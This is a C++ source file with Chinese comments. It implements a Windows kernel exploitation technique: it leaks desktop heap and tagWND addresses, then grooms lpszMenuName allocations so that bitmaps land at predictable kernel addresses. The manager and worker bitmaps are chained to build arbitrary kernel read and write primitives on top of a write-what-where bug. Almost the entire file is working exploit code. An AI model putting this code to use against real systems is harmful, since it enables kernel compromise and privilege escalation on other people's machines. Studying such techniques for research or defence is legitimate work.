/*
* bypass.cpp:
*	[+] 使用tagWND进行任意的读写
*/
#include "bypass.h"

DWORD64 win32ClientInfo = 0;
DWORD64 UserKernelDesktopHeap = 0;
DWORD64 kernelDesktopHeap = 0;
DWORD64 ulClientDelta = 0;
HBMP workerBmp = {};
HBMP managerBmp = {};
DWORD64 leakBitmap()
{
	

	DWORD64 tebBase = (DWORD64)NtCurrentTeb();
	//std::cout << "[+] teb at: " <<  std::setiosflags(std::ios::uppercase)  << std::hex << tebBase << std::endl;
	UserKernelDesktopHeap = *(PDWORD64)(tebBase + 0x828);
	//std::cout << "[+] User mappped Desktop heap at: "<< std::setiosflags(std::ios::uppercase)  << std::hex << UserKernelDesktopHeap << std::endl;
	kernelDesktopHeap = *(PDWORD64)(UserKernelDesktopHeap + 0x28);
	//std::cout << "[+] kernel desktop at: " << std::setiosflags(std::ios::uppercase) << std::hex << kernelDesktopHeap << std::endl;
	ulClientDelta = kernelDesktopHeap - UserKernelDesktopHeap;
	//std::cout << "[+] uClientDelta: " << std::setiosflags(std::ios::uppercase) << std::hex << ulClientDelta << std::endl;
	return 0;
}

DWORD64 leakWnd(HWND leakWnd)
{
	PDWORD64 buffer = (PDWORD64)UserKernelDesktopHeap;

	DWORD i = 0;
	while (1)
	{
		if (buffer[i] == (DWORD64)leakWnd)
		{
			return (DWORD64)(buffer + i );
		}
		i++;
	}

}

DWORD64 lpszMenuName(HWND hwnd)
{
	leakBitmap();

	DWORD64 kiss = leakWnd(hwnd);
	//std::cout << "[+] user address leak tagWND at: " << std::setiosflags(std::ios::uppercase) << std::hex << kiss << std::endl;
	DWORD64 kernelTagCls = *(PDWORD64)(kiss+0xa8);
	//std::cout << "[+] kernel cls at: " << std::setiosflags(std::ios::uppercase) << std::hex << kernelTagCls << std::endl;
	DWORD64 lpszNamemenuAddr = *(PDWORD64)(kernelTagCls - ulClientDelta + 0x90);

	//std::cout << "[+] kernel address leak lpszMenuName at: " << std::setiosflags(std::ios::uppercase) << std::hex <<lpszNamemenuAddr << std::endl;
	//std::cout << std::endl;
	return lpszNamemenuAddr;
}

/*
* readOOB:
*	[+] 对任意地址进行读操作
*	[+] whereRead: 读的地址
*	[+] whatValue: 获取读的值
*	[+] len: 读的长度(BYTE)
*/
VOID readOOB(DWORD64 whereRead, LPVOID whatValue, int len)
{
	// 使用manager的pvScan改变worker的pvScan地址
	SetBitmapBits(managerBmp.hBmp, len, &whereRead);	// 改变任意地址
	GetBitmapBits(workerBmp.hBmp, len, whatValue);	// 读
}

/*
* writeOOB:
*	[+] 对任意地址进行写操作
*	[+] whereRead: 写的地址
*	[+] whatValue: 写入的值
*/
VOID writeOOB(DWORD64 whereWrite, LPVOID whatValue, int len)
{
	__debugbreak();
	SetBitmapBits(managerBmp.hBmp, len, &whereWrite);
	SetBitmapBits(workerBmp.hBmp, len, &whatValue);	// 写
}


HBMP leak()
{
	HBMP hbmp;
	DWORD64 curr = 0;
	DWORD64 prev = 1;
	for (int i = 0; i < 0x700; i++)
	{
		char buf[0x8f0];
		memset(buf, 0x41, 0x8f0);
		WNDCLASSEX wnd = { 0x0 };
		wnd.cbSize = sizeof(wnd);
		wnd.lpszClassName = TEXT("case");
		wnd.lpszMenuName = buf;
		wnd.lpfnWndProc = DefWindowProc;
		int result = RegisterClassEx(&wnd);
	
		if (!result)
		{
			printf("RegisterClassEx error: %d\r\n", GetLastError());
		}

		HWND test = CreateWindowEx(
			0,
			wnd.lpszClassName,
			TEXT("WORDS"),
			0,
			CW_USEDEFAULT,
			CW_USEDEFAULT,
			CW_USEDEFAULT,
			CW_USEDEFAULT,
			NULL, NULL, NULL, NULL);
		curr = lpszMenuName(test);

		if (curr == prev)
		{
			DestroyWindow(test);
			UnregisterClass(wnd.lpszClassName, NULL);
			WCHAR* Buff = new WCHAR[0x50 * 2 * 4];
			RtlSecureZeroMemory(Buff, 0x50 * 2 * 4);
			RtlFillMemory(Buff, 0x50 * 2 * 4, '\x41');
			hbmp.hBmp = CreateBitmap(0x701, 2, 1, 8, Buff);
			hbmp.kAddr = curr;
			hbmp.pvScan0 = (PUCHAR)(curr + 0x50);
			
			return hbmp;
		}

		DestroyWindow(test);
		UnregisterClass(wnd.lpszClassName, NULL);
		prev = curr;
	}
	return hbmp;
}

VOID bypassDemo()
{
	BOOL bFound = FindHMValidateHandle();
	if (!bFound) {
		printf("Failed to locate HmValidateHandle, exiting\n");
		return;
	}
	WNDCLASSEX wnd = { 0x0 };
	wnd.cbSize = sizeof(wnd);
	wnd.lpszClassName = TEXT("MainWClass");
	wnd.lpszMenuName = TEXT("AAAAA");
	wnd.lpfnWndProc = DefWindowProc;
	int result = RegisterClassEx(&wnd);
	if (!result)
	{
		printf("RegisterClassEx error: %d\r\n", GetLastError());
	}

	HWND test = CreateWindowEx(
		0,
		wnd.lpszClassName,
		TEXT("WORDS"),
		0,
		CW_USEDEFAULT,
		CW_USEDEFAULT,
		CW_USEDEFAULT,
		CW_USEDEFAULT,
		NULL, NULL, NULL, NULL);


	managerBmp = leak();
	workerBmp = leak();
	std::cout << "[+] managerBmp address leak pvScan0 at: " << std::setiosflags(std::ios::uppercase) << std::hex << (DWORD64)managerBmp.pvScan0 << std::endl;
	std::cout << "[+] workerBmp address leak pvScan0 at: " << std::setiosflags(std::ios::uppercase) << std::hex << (DWORD64)workerBmp.pvScan0 << std::endl;
	write_what_where_qword((DWORD64)managerBmp.pvScan0,(DWORD64)workerBmp.pvScan0);	// 设置正确
}